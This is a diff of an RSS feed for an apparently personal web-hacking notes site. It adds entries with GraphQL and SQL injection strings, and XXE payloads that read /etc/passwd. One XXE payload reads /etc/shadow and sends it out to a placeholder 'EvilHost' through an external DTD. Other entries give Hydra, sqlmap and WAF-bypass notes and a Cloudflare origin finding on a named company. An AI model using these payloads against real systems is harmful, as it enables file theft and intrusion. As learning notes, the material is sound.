@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>WebApps on Pwny_Sec</title>
@@ -12,6 +12,16 @@
     
     <item>
       <title></title>
+      <link>/webapp/earnest-orign/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/earnest-orign/</guid>
+      <description>Well, I have spent three days trying to exploit the site. There isn&amp;rsquo;t much to report there are some cors misconfigurations and the authorization header. If you would be interested in those finding let me know. Let us get to the issue that brings me here, a misconfiguration in Cloudflare.
+The Front-end resolves to www.earnest.com.cdn.cloudflare.net at 104.18.2.230 owned by CloudFlare, these are your reverse proxy and WAF domain and IP. I tried to get the Origin IP using https://censys.</description>
+    </item>
+    
+    <item>
+      <title></title>
       <link>/webapp/exploiting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
@@ -19,6 +29,29 @@
       <description>So I&amp;rsquo;m going to try and do a better job here than the first one. Here we will cover attacking the different web applications. First will explore bypassing user authenication by the front end. the back end will assume all request are valid. this is fix in version two of HTTP.
 by submitting this request twice. were able to get
 POST / HTTP/1.1 Host: ac1d1f671e4a193c810c2562008000fd.web-security-academy.net User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/webapp/ssrf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/ssrf/</guid>
+      <description>When a server makes a request to another part of the website you can.
+Finding the vulnerability use google search for jira europa and the name of the website.
+Tips &amp;amp; Tricks
+@thedawgyg
+When testing for SSRF, change the HTTP version from 1.1 to HTTP/0.9 and remove the host header completely. This has worked to bypass several SSRF fixes in the past.
+On HTTP/0.9 you dont need a host header at all.</description>
+    </item>
+    
+    <item>
+      <title>Bypassing WAF</title>
+      <link>/webapp/bypasswaf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/bypasswaf/</guid>
+      <description>https://blog.christophetd.fr/bypassing-cloudflare-using-internet-wide-scan-data/ https://medium.com/bugbountywriteup/bypass-cloudflare-waf-to-pwned-application-2c9e4f862319</description>
     </item>
     
     <item>
@@ -30,6 +63,19 @@ POST / HTTP/1.1 Host: ac1d1f671e4a193c810c2562008000fd.web-security-academy.net 
       <description>What is Gobuster? Gobuster is a web application fuzzer designed to enumerate Web Directories and Domains
 Gobuster has been recently updated, it has some new features and they changed it everything around. It&amp;rsquo;s still the gobuster we Love but its different now it went though some changes. I&amp;rsquo;m not sure if the kali repo has updated yet, you may need to download gobuster form the github repo.
 Example&amp;rsquo;s For DIR:</description>
+    </item>
+    
+    <item>
+      <title>Graphql</title>
+      <link>/webapp/graphql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/graphql/</guid>
+      <description>GRaphQL injection
+EndPoints:
+/graphql/ /graphql/console/ /graphql.php /graphiql/ /graphiql.php Injection:
+OR SLEEP(20) union (sleep(10)) and &#39;1=1 &#39;;SELECT 1;SELECT pg_sleep\(30\);-- &#39; union select current_user(),database(),3 and &#39;1=1 (id:\&#39;\&#39;) to get the __schema
+{&amp;quot;query&amp;quot;:&amp;quot;query listPromotionalCartItems {\n __schema{\n types{\n name \n} \n} \n} \n&amp;quot;,&amp;quot;variables&amp;quot;:{}} {&amp;quot;query&amp;quot;:&amp;quot;query {\n __schema{\n types{\n name \n} \n} \n} \n&amp;quot;,&amp;quot;variables&amp;quot;:{}} { &amp;quot;query&amp;quot;: &amp;quot;{ __type(name: \&amp;quot;User\&amp;quot;) { name fields { name } } }&amp;quot;,&amp;quot;variables&amp;quot;:{}} </description>
     </item>
     
     <item>
@@ -51,7 +97,7 @@ Some server support transfer-encoding headers which, breaks up request. There ar
       
       <guid>/webapp/hydra/</guid>
       <description>Hydra is a WebApp Brutefocer. suupply it with the required information and it will enumrate logins based on customer login word list of you could use rock you.
-Hydra v8.8 &amp;copy; 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
  Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PO RT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]] Options: -R restore a previous aborted/crashed session -I ignore an existing restore file (don&#39;t wait 10 seconds) -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type &amp;quot;-x -h&amp;quot; to get help -y disable use of symbols in bruteforce, see above -e nsr try &amp;quot;n&amp;quot; null password, &amp;quot;s&amp;quot; login as pass and/or &amp;quot;r&amp;quot; reversed login -u loop around users, not passwords (effective!</description>
     </item>
     
@@ -63,7 +109,7 @@ Hydra v8.8 &amp;copy; 2019 by van Hauser/THC - Please do not use in military or 
       <guid>/webapp/sqlmap/sqlmap/</guid>
       <description>SqlMap automates finding sql-injection it can use GET or POST request. It&amp;rsquo;s pretty neat.
 In burp right click select copy to file, this will test for sql injection. pretty cool wasn&amp;rsquo;t aware it would test all the parameters. sqlmap &amp;ndash;batch -r login.req
-sqlmap --batch -u &amp;quot;http://os.htb/users/admin*&amp;quot; --level 5 --risk 3 -u url also for get request --batch run default yes --* = the parameter to fuzz --dump , --dump-all dumping sqldb to a localfile in /  </description>
+sqlmap --batch -u &amp;quot;http://os.htb/users/admin*&amp;quot; --level 5 --risk 3-u url also for get request--batch run default yes--* = the parameter to fuzz--dump , --dump-all dumping sqldb to a localfile in /</description>
     </item>
     
     <item>
@@ -72,9 +118,23 @@ sqlmap --batch -u &amp;quot;http://os.htb/users/admin*&amp;quot; --level 5 --ris
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/webapp/user-inputt/</guid>
-      <description>Bypassing WAFS, and other mechanism, using &amp;ldquo;Web Application hackers handbook&amp;rdquo; as my guide. We&amp;rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.
+      <description>https://portswigger.net/polls/top-10-web-hacking-techniques-2019
+Bypassing WAFS, and other mechanism, using &amp;ldquo;Web Application hackers handbook&amp;rdquo; as my guide. We&amp;rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.
 I&amp;rsquo;ve heard good things about this book and figured doing a small writeup on it might be a fun experience.
 Bypassing BlackList - Sometimes the blacklist is literal this means it will look for SELECT, and any other iteration of select will be ignored like SelEcT.</description>
+    </item>
+    
+    <item>
+      <title>XXE</title>
+      <link>/webapp/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/xxe/</guid>
+      <description>Description
+Payloads
+&amp;lt;%3fxml+version%3d&amp;quot;1.0&amp;quot;+%3f&amp;gt;&amp;lt;!DOCTYPE+r+[&amp;lt;!ELEMENT+r+ANY&amp;gt;&amp;lt;!ENTITY+sp+SYSTEM+&amp;quot;http%3a//kart.finn.no&amp;quot;&amp;gt;]&amp;gt;&amp;lt;r&amp;gt;%26sp%3b&amp;lt;/r&amp;gt; &amp;lt;?xml version=&amp;quot;1.0&amp;quot; ?&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;quot;http://x.x.x.x:443/test.txt&amp;quot;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; &amp;lt;%3fxml+version%3d&amp;quot;1.0&amp;quot;+encoding%3d&amp;quot;ISO-8859-1&amp;quot;%3f&amp;gt;&amp;lt;!DOCTYPE+foo+[++&amp;lt;!ELEMENT+foo+ANY+&amp;gt;&amp;lt;!ENTITY+xxe+SYSTEM+&amp;quot;file%3a///etc/passwd&amp;quot;+&amp;gt;]&amp;gt;&amp;lt;foo&amp;gt;%26xxe%3b&amp;lt;/foo&amp;gt; &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///etc/passwd&amp;quot; &amp;gt;]&amp;gt;&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt; oob extraction
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ENTITY % data3 SYSTEM &amp;quot;file:///etc/shadow&amp;quot;&amp;gt; &amp;lt;!ENTITY % sp SYSTEM &amp;quot;http://EvilHost:port/sp.dtd&amp;quot;&amp;gt; %sp; %param3; %exfil; ]&amp;gt; ## External dtd: ## &amp;lt;!ENTITY % param3 &amp;quot;&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM &#39;ftp://Evilhost:port/%data3;&#39;&amp;gt;&amp;quot;&amp;gt; soap
+&amp;lt;soap%3aBody&amp;gt;&amp;lt;foo&amp;gt;&amp;lt;![CDATA[&amp;lt;!DOCTYPE+doc+[&amp;lt;!ENTITY+%25+dtd+SYSTEM+&amp;quot;https%3a//kart.finn.no/&amp;quot;&amp;gt;+%25dtd%3b]&amp;gt;&amp;lt;xxx/&amp;gt;]]&amp;gt;&amp;lt;/foo&amp;gt;&amp;lt;/soap%3aBody&amp;gt; XML XXE</description>
     </item>
     
   </channel>
